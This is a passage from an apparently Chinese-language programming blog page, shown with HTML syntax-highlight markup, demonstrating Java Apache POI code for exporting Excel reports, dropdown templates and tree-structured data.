punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFreeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFreeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportAllNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportAllNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFeeAllNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFeeAllNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFreeAllNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFreeAllNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="ExcelExportUtil对应controller类"><a href="#ExcelExportUtil对应controller类" class="headerlink" title="ExcelExportUtil对应controller类"></a>ExcelExportUtil对应controller类</h2><pre class=" language-java"><code class="language-java">  <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"接口调用情况统计-导出数据"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"exportV2"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportV2</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> ExportChargeReportReq req<span class="token punctuation">,</span>                       HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"对外API 接口调用情况统计-导出数据,请求参数:{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>ExportChargeReportVo<span class="token operator">></span> exportChargeReport <span class="token operator">=</span> chargeReportService<span class="token punctuation">.</span><span class="token function">getExportChargeReport</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span><span class="token function">getProductName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"查得结果条数：{}\n 查询结果：{}"</span><span class="token punctuation">,</span> exportChargeReport<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exportChargeReport<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>CollectionUtils<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>exportChargeReport<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//将选中数据导出到excel</span>            ExcelExportUtil excelExportUtil <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelExportUtil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            excelExportUtil<span class="token punctuation">.</span><span class="token function">exportChargeReportExcel</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> exportChargeReport<span class="token punctuation">,</span> req<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="Excel图片"><a href="#Excel图片" class="headerlink" title="Excel图片"></a>Excel图片</h3><p><img src="/images/Excel%E6%A0%B7%E4%BE%8B.png" alt="样例3"></p><h2 id="传参数导出"><a href="#传参数导出" class="headerlink" title="传参数导出"></a>传参数导出</h2><pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"导出"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"export"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> WinProjectReq winProjectReq<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//查询要导出的数据</span>        List<span class="token operator">&lt;</span>WinnerExportVo<span class="token operator">></span> list <span class="token operator">=</span> winProjectService<span class="token punctuation">.</span><span class="token function">selectExportList</span><span class="token punctuation">(</span>winProjectReq<span class="token punctuation">)</span><span class="token punctuation">;</span>        ExcelUtil<span class="token operator">&lt;</span>WinnerExportVo<span class="token operator">></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token operator">&lt;</span>WinnerExportVo<span class="token operator">></span><span class="token punctuation">(</span>WinnerExportVo<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        util<span class="token punctuation">.</span><span class="token function">exportExcel</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span>list<span class="token punctuation">,</span> <span class="token string">"中标企业名单导出"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="导出模板动态下拉框"><a href="#导出模板动态下拉框" class="headerlink" title="导出模板动态下拉框"></a>导出模板动态下拉框</h2><blockquote><p>下拉选项有数量限制</p></blockquote><pre class=" language-java"><code class="language-java">  <span class="token comment" spellcheck="true">/**     * 动态下拉框导出     *     * @Author: CZM     * @Param: [response]     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ProjectOptions</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String templateFilePath <span class="token operator">=</span> <span class="token string">"template.xlsx"</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span>SXSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SXSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            SXSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"项目库信息"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//列宽</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"项目类别"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"项目名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"建设地点"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"所属行业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"对接企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"项目建设内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"对应环节"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"项目进度"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"投资额(万元)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"所属园区"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//            查询园区</span>            <span class="token comment" spellcheck="true">//</span>            <span class="token comment" spellcheck="true">// 添加下拉框选项</span>            DataValidationHelper validationHelper <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">getDataValidationHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CellRangeAddressList addressList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CellRangeAddressList</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 下拉框范围</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Option 1"</span><span class="token punctuation">,</span> <span class="token string">"Option 2"</span><span class="token punctuation">,</span> <span class="token string">"Option 3"</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 下拉框选项</span>            DataValidationConstraint constraint <span class="token operator">=</span> validationHelper<span class="token punctuation">.</span><span class="token function">createExplicitListConstraint</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>            DataValidation dataValidation <span class="token operator">=</span> validationHelper<span class="token punctuation">.</span><span class="token function">createValidation</span><span class="token punctuation">(</span>constraint<span class="token punctuation">,</span> addressList<span class="token punctuation">)</span><span class="token punctuation">;</span>            dataValidation<span class="token punctuation">.</span><span class="token function">setShowPromptBox</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 显示提示框</span>            dataValidation<span class="token punctuation">.</span><span class="token function">createPromptBox</span><span class="token punctuation">(</span><span class="token string">"提示"</span><span class="token punctuation">,</span> <span class="token string">"请选择一个选项"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置提示框内容</span>            dataValidation<span class="token punctuation">.</span><span class="token function">setShowErrorBox</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 显示错误框</span>            dataValidation<span class="token punctuation">.</span><span class="token function">createErrorBox</span><span class="token punctuation">(</span><span class="token string">"错误"</span><span class="token punctuation">,</span> <span class="token string">"请选择一个选项"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置错误框内容</span>            sheet<span class="token punctuation">.</span><span class="token function">addValidationData</span><span class="token punctuation">(</span>dataValidation<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 保存模板文件</span>            <span class="token keyword">try</span> <span class="token punctuation">(</span>FileOutputStream fileOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>templateFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>fileOut<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Template exported successfully."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">ProjectOptions</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="树形结构数据导出"><a href="#树形结构数据导出" class="headerlink" title="树形结构数据导出"></a>树形结构数据导出</h2><p>效果图</p><p><img src="/images/Excel%E6%A0%B7%E4%BE%8B2.png" alt="效果"></p><p>maven依赖</p><pre class=" language-java"><code class="language-java">   <span class="token operator">&lt;</span>dependency<span class="token operator">></span>      <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>      <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>poi<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>      <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">4.1</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>    <span class="token operator">&lt;</span>dependency<span class="token operator">></span>      <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>      <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>poi<span class="token operator">-</span>ooxml<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>      <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">4.1</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><p>实现代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>cd<span class="token punctuation">.</span>test2<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>util<span class="token punctuation">.</span>CellRangeAddress<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>util<span class="token punctuation">.</span>CellUtil<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFWorkbook<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeDataToExcel</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> String name<span class="token punctuation">;</span>        <span class="token keyword">private</span> List<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> children<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>children <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addChild</span><span class="token punctuation">(</span>TreeNode child<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>children<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建样本树形数据</span>        TreeNode rootNode <span class="token operator">=</span> <span class="token function">createSampleTreeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 使用 try-with-resources 创建一个新的 Excel 工作簿和文件输出流</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span>Workbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> FileOutputStream fileOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"exported_tree_with_header.xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 在工作簿中创建一个名为 "Tree Data" 的工作表</span>            Sheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"Tree Data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建工作表的表头</span>            <span class="token function">createHeader</span><span class="token punctuation">(</span>sheet<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 将树形数据填充到工作表中，从第二行第一列（索引从0开始）开始填充</span>            <span class="token function">fillTreeData</span><span class="token punctuation">(</span>sheet<span class="token punctuation">,</span> rootNode<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 将工作簿写入文件输出流，即保存为文件</span>            workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>fileOut<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">createHeader</span><span class="token punctuation">(</span>Sheet sheet<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Row headerRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Cell headerCell <span class="token operator">=</span> headerRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            headerCell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"表头"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        sheet<span class="token punctuation">.</span><span class="token function">autoSizeColumn</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> TreeNode <span class="token function">createSampleTreeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode rootNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token string">"Root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TreeNode child1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token string">"Child1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TreeNode child2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token string">"Child2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TreeNode subChild1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token string">"Subchild1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TreeNode subChild2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token string">"Subchild2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TreeNode subChild3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token string">"Subchild3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        rootNode<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token 